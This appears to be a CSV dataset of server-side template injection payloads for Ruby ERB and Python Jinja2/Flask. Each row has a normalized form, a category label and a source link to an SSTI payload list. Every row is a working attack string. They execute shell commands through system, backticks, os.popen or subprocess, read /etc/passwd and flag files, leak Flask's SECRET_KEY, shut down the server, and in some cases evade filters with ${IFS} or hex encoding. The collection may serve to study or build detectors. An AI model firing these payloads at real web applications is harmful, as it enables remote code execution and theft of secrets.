"<%= self.instance_eval(""system('id')"") %>","<%=self.instance_eval(""S"")%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= self.class_eval(""system('id')"") %>","<%=self.class_eval(""S"")%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= self.module_eval(""system('id')"") %>","<%=self.module_eval(""S"")%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= binding.eval(""system('id')"") %>","<%=binding.eval(""S"")%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= binding.pry %>,<%=binding.pry%>,ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= binding.irb %>,<%=binding.irb%>,ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= eval(""'id'.tap{|x|system(x)}"") %>","<%=eval(""S"")%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= ""id"".tap{|x|system(x)} %>","<%=""S"".tap{|x|system(x)}%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= [""id""].each{|x|system(x)} %>","<%=[""S""].each{|x|system(x)}%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= [""id""].map{|x|system(x)} %>","<%=[""S""].map{|x|system(x)}%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= [""id""].select{|x|system(x)} %>","<%=[""S""].select{|x|system(x)}%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= [""id""].find{|x|system(x)} %>","<%=[""S""].find{|x|system(x)}%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= [""id""].detect{|x|system(x)} %>","<%=[""S""].detect{|x|system(x)}%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= [""id""].inject{|x|system(x)} %>","<%=[""S""].inject{|x|system(x)}%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= [""id""].reduce{|x|system(x)} %>","<%=[""S""].reduce{|x|system(x)}%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= 1.times{system(""id"")} %>","<%=N.times{system(""S"")}%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= loop{system(""id"");break} %>","<%=loop{system(""S"");break}%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= Pathname.new(""/etc/passwd"").read %>","<%=pathname.new(""S"").read%>",ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= Pathname.new(""/"").entries %>","<%=pathname.new(""S"").entries%>",ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= Pathname.new(""."").glob(""*"") %>","<%=pathname.new(""S"").glob(""S"")%>",ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= Shellwords.escape(""id"") %>","<%=shellwords.escape(""S"")%>",ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= Shellwords.split(""id"") %>","<%=shellwords.split(""S"")%>",ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= URI.open(""|id"").read %>","<%=uri.open(""S"").read%>",ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= Etc.getlogin %>,<%=etc.getlogin%>,ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= Etc.getpwnam(""root"") %>","<%=etc.getpwnam(""S"")%>",ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= Etc.passwd %>,<%=etc.passwd%>,ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= ERB.new(""<%=system('id')%>"").result %>","<%=erb.new(""S"").result%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= ERB.new(""<%=`id`%>"").result %>","<%=erb.new(""S"").result%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= ERB.new(""<%=File.read('/etc/passwd')%>"").result %>","<%=erb.new(""S"").result%>",ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= TOPLEVEL_BINDING.eval(""system('id')"") %>","<%=toplevel_binding.eval(""S"")%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= TOPLEVEL_BINDING.eval(""`id`"") %>","<%=toplevel_binding.eval(""S"")%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= TOPLEVEL_BINDING.eval(""File.read('/etc/passwd')"") %>","<%=toplevel_binding.eval(""S"")%>",ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= BasicObject.new.instance_eval{system(""id"")} %>","<%=basicobject.new.instance_eval{system(""S"")}%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= Class.new.class_eval{system(""id"")} %>","<%=class.new.class_eval{system(""S"")}%>",ruby,ERB,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= Module.new.module_eval{system(""id"")} %>","<%=module.new.module_eval{system(""S"")}%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= [].instance_eval{system(""id"")} %>","<%=[].instance_eval{system(""S"")}%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= """".instance_eval{system(""id"")} %>","<%=""S"".instance_eval{system(""S"")}%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= {}.instance_eval{system(""id"")} %>","<%={}.instance_eval{system(""S"")}%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= Marshal.load(Marshal.dump(system(""id""))) %>","<%=marshal.load(marshal.dump(system(""S"")))%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= YAML.load(""--- !ruby/object:Gem::Installer\ni: x\n"") %>","<%=yaml.load(""S"")%>",ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= YAML.load(""--- !ruby/object:Gem::Requirement\nrequirements: !ruby/object:Gem::Package::TarReader\nio: &1 !ruby/object:Net::BufferedIO\nio: &1 !ruby/object:Gem::Package::TarReader::Entry\nread: 0\nheader: \""abc\""\n@io: *1\n"") %>","<%=yaml.load(""S""abc\""S"")%>",ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= `#{""id""}` %>","<%=`#{""S""}`%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= system(""#{""id""}"") %>","<%=system(""S""id""S"")%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= eval(""#{""system('id')""}"") %>","<%=eval(""S""system('S')""S"")%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= IO.popen(""#{""id""}"").read %>","<%=io.popen(""S""id""S"").read%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= %x{#{""id""}} %>","<%=%x{#{""S""}}%>",ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= %x{cat${IFS}/etc/passwd} %>,<%=%x{cat${ifs}/etc/passwd}%>,ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= system(""cat${IFS}/etc/passwd"") %>","<%=system(""S"")%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= `cat$IFS/etc/passwd` %>,<%=`cat$ifs/etc/passwd`%>,ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= system(""cat</etc/passwd"") %>","<%=system(""S"")%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= `cat<flag.txt` %>,<%=`cat<flag.txt`%>,ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= system(""cat<flag.txt"") %>","<%=system(""S"")%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= ""\x73\x79\x73\x74\x65\x6d"".to_sym.to_proc.call(""id"") %>","<%=""S"".to_sym.to_proc.call(""S"")%>",ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= :system.to_proc.call(""id"") %>","<%=:system.to_proc.call(""S"")%>",ruby,ERB,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= :exec.to_proc.call(""id"") %>","<%=:exec.to_proc.call(""S"")%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= :eval.to_proc.call(""system('id')"") %>","<%=:eval.to_proc.call(""S"")%>",ruby,ERB,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
{{request}},{{request}},python,Jinja2,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{''.__class__}},{{'S'.__class__}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{[].__class__}},{{[].__class__}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{{}.__class__}},{{{}.__class__}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{''.join}},{{'S'.join}},python,Jinja2,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{request.environ}},{{request.environ}},python,Jinja2,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{request.application}},{{request.application}},python,Jinja2,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{get_flashed_messages.__globals__}},{{get_flashed_messages.__globals__}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{lipsum.__globals__}},{{lipsum.__globals__}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{cycler.__init__.__globals__}},{{cycler.__init__.__globals__}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{joiner.__init__.__globals__}},{{joiner.__init__.__globals__}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{namespace.__init__.__globals__}},{{namespace.__init__.__globals__}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{''.__class__.__mro__}},{{'S'.__class__.__mro__}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{[].__class__.__mro__}},{{[].__class__.__mro__}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{{}.__class__.__mro__}},{{{}.__class__.__mro__}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{''.__class__.__mro__[1]}},{{'S'.__class__.__mro__[N]}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{''.__class__.__mro__[2]}},{{'S'.__class__.__mro__[N]}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{[].__class__.__base__}},{{[].__class__.__base__}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{{}.__class__.__base__}},{{{}.__class__.__base__}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{''.__class__.__base__}},{{'S'.__class__.__base__}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{''.__class__.__mro__[1].__subclasses__()}},{{'S'.__class__.__mro__[N].__subclasses__()}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{[].__class__.__base__.__subclasses__()}},{{[].__class__.__base__.__subclasses__()}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{{}.__class__.__base__.__subclasses__()}},{{{}.__class__.__base__.__subclasses__()}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{%for c in [].__class__.__base__.__subclasses__()%}{{c.__name__}},{%endfor%}","{%forcin[].__class__.__base__.__subclasses__()%}{{c.__name__}},{%endfor%}",python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{''.__class__.__mro__[2].__subclasses__()}},{{'S'.__class__.__mro__[N].__subclasses__()}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{request.__class__.__mro__[1].__subclasses__()}},{{request.__class__.__mro__[N].__subclasses__()}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{request.__class__.__mro__[8].__subclasses__()}},{{request.__class__.__mro__[N].__subclasses__()}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{request.__class__.__mro__[9].__subclasses__()}},{{request.__class__.__mro__[N].__subclasses__()}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read()}},{{self._templatereference__context.joiner.__init__.__globals__.os.popen('S').read()}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read()}},{{self._templatereference__context.namespace.__init__.__globals__.os.popen('S').read()}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{config.__class__.__init__.__globals__['os'].popen('id').read()}},{{config.__class__.__init__.__globals__['S'].popen('S').read()}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}},{{'S'.__class__.__mro__[N].__subclasses__()[N]('S').read()}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{''.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__.__builtins__['open']('/etc/passwd').read()}},{{'S'.__class__.__mro__[N].__subclasses__()[N].__init__.__globals__.__builtins__['S']('S').read()}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read()}},{{'S'.__class__.__mro__[N].__subclasses__()[N].__init__.__globals__['S'].modules['S'].popen('S').read()}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{''.__class__.__mro__[1].__subclasses__()[230]('id',shell=True,stdout=-1).communicate()[0].strip()}}","{{'S'.__class__.__mro__[N].__subclasses__()[N]('S',shell=true,stdout=-N).communicate()[N].strip()}}",python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}","{{'S'.__class__.__mro__[N].__subclasses__()[N]('S',shell=true,stdout=-N).communicate()[N].strip()}}",python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{[].__class__.__base__.__subclasses__()[40]('/etc/passwd').read()}},{{[].__class__.__base__.__subclasses__()[N]('S').read()}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{[].__class__.__base__.__subclasses__()[59].__init__.__globals__.__builtins__['open']('/etc/passwd').read()}},{{[].__class__.__base__.__subclasses__()[N].__init__.__globals__.__builtins__['S']('S').read()}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{[].__class__.__base__.__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read()}},{{[].__class__.__base__.__subclasses__()[N].__init__.__globals__['S'].modules['S'].popen('S').read()}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{[].__class__.__base__.__subclasses__()[230]('id',shell=True,stdout=-1).communicate()[0].strip()}}","{{[].__class__.__base__.__subclasses__()[N]('S',shell=true,stdout=-N).communicate()[N].strip()}}",python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{[].__class__.__base__.__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}","{{[].__class__.__base__.__subclasses__()[N]('S',shell=true,stdout=-N).communicate()[N].strip()}}",python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{request.__class__._load_form_data.__globals__.__builtins__.open('/etc/passwd').read()}},{{request.__class__._load_form_data.__globals__.__builtins__.open('S').read()}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{request.__class__._load_form_data.__globals__.__builtins__.__import__('os').popen('id').read()}},{{request.__class__._load_form_data.__globals__.__builtins__.__import__('S').popen('S').read()}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{request.environ['werkzeug.server.shutdown']()}},{{request.environ['S']()}},python,Jinja2,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read()}},{{get_flashed_messages.__globals__.__builtins__.open('S').read()}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{get_flashed_messages.__globals__.__builtins__.__import__('os').popen('id').read()}},{{get_flashed_messages.__globals__.__builtins__.__import__('S').popen('S').read()}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{url_for.__globals__['__builtins__']['eval'](""__import__('os').popen('id').read()"")}}","{{url_for.__globals__['S']['S'](""S"")}}",python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{url_for.__globals__['__builtins__']['exec'](""__import__('os').popen('id').read()"")}}","{{url_for.__globals__['S']['S'](""S"")}}",python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{url_for.__globals__['__builtins__']['__import__']('os').popen('id').read()}},{{url_for.__globals__['S']['S']('S').popen('S').read()}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{url_for.__globals__['current_app'].config['SECRET_KEY']}},{{url_for.__globals__['S'].config['S']}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}},{{config.__class__.__init__.__globals__['S'].popen('S').read()}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__=='catch_warnings'%}{{c.__init__.__globals__['__builtins__'].open('/etc/passwd','r').read()}}{%endif%}{%endfor%}","{%forcin[].__class__.__base__.__subclasses__()%}{%ifc.__name__=='S'%}{{c.__init__.__globals__['S'].open('S','S').read()}}{%endif%}{%endfor%}",python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__=='catch_warnings'%}{{c.__init__.__globals__['__builtins__'].__import__('os').popen('id').read()}}{%endif%}{%endfor%},{%forcin[].__class__.__base__.__subclasses__()%}{%ifc.__name__=='S'%}{{c.__init__.__globals__['S'].__import__('S').popen('S').read()}}{%endif%}{%endfor%},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
